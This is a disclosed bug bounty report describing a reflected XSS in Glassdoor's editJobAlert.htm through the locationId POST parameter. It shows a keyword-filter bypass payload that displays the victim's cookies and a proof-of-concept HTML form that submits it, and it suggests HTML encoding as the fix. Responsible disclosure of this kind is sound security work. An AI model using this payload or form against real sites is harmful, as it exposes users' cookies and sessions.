# [XSS] Reflected XSS via POST request in (editJobAlert.htm) file

## Report Details
- **Report ID**: 838910
- **URL**: https://hackerone.com/reports/838910
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-04T16:02:43.409Z
- **Disclosed**: 2021-04-16T02:36:05.698Z

## Reporter
- **Username**: flex0geek
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: glassdoor

## Vulnerability Information
### Description:

first, it was a very good bug for me it starts when I was testing the form for I found a CSRF I sent it here #838778 I tested the form again and after few minutes I found that this parameter `locationId` in the post request is vulnerable to XSS the page take the value of this parameter and add it to `a` tag here
```
<a href='/Job/jobs.htm?sc.keyword=&locId=3438985'>
```
i added this value `flex0'` and I could get out of the `href` attribute so I closed the tag too using `>` and now i start my journey to found a valid payload which can work with this filter I tried a looooooot of payloads it takes me hours to bypass the filter block this values `alert, confirm, write, prompt` if there is any value after it i tried a lot of encoding to bypass it but nothing works with me so i start to think out of the box and search on google too and I got this one `[0].find(confirm)` this value is equal to `confirm(0)` so it can work and there is nothing blocked on this value so I added my payload here
```
'><marquee onstart="[cookie].find(confirm)">
```
this payload will pop up with the cookies of the victim now because it was in a POST request I used it with an HTML code here
```html
<form action="https://www.glassdoor.com/profile/editJobAlert.htm" method="post">
    <input type="text" name="setupJobAlertEmail" value="false"><br>
    <input type="text" name="userValidationKey" value=""><br>
    <input type="text" name="key" value=""><br>
    <input type="text" name="jobAlertId" value="[the id of the jobalert]"><br>
    <input type="text" name="JAK" value=""><br>
    <input type="text" name="reactivation" value="false"><br>
    <input type="text" name="linkOrigin" value=""><br>
    <input type="text" name="keywords" value="[the name]"><br>
    <input type="text" name="rawLocationName" value="Cairo"><br>
    <input type="text" name="locationType" value="C"><br>
    <input type="text" name="locationId" value="3438985"><br>
    <input type="text" name="emailFrequency" value="WEEKLY"><br>
    <input type="submit" value="send">
</form>
```
the payload will be added in the `locationId` parameter in this code notice that we can make the form send the request automaticly without any interaction from the user but in my POC I didn't use that because I changed the value a lot to prove the bug in the Video POC is involve the coockies and the domain name and a value too so i can use it as Full XSS the Vidoe is here

{F773437}

### Steps:

1. take the value and add to HTML file and add your payload in `locationId`
2. open this file in your browser and send the request
3. you will see that the payload works and the pop-up happened


### Fix:

you should add a function to encode the value of this parameter with HTML encode like other parameters

## Impact

I can execute JS code on the websites's users.

## Attachments
- xss_poc.wmv
